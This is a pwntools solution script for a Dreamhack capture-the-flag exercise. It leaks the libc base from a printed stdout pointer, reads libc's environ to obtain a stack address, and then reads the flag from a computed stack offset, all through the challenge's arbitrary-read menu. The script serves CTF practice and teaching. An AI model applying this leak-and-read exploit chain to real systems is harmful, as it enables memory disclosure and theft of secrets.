from pwn import *

REMOTE = True

if not REMOTE:
    r = process('/home/environ_exercise/environ_exercise')
    stdout_offset = 0x3ec760
    environ_offset = 0x61c118
else:
    r = remote('host1.dreamhack.games', 13219)
    stdout_offset = 0x3ec760
    environ_offset = 0x61c118

sla = r.sendlineafter


# leak libc

r.recvuntil('stdout: 0x')
stdout = int(r.recvline()[:-1], 16)  # _IO_2_1_stdout_
libc = stdout - stdout_offset  # libc base
environ = libc + environ_offset  # environ


# leak stack

sla('> ', '1')
sla('Addr: ', str(environ))

stack = u64(r.recvn(6).ljust(8, b'\x00'))
flag = stack - 0x1538


# read flag

sla('> ', '1')
sla('Addr: ', str(flag))


r.interactive()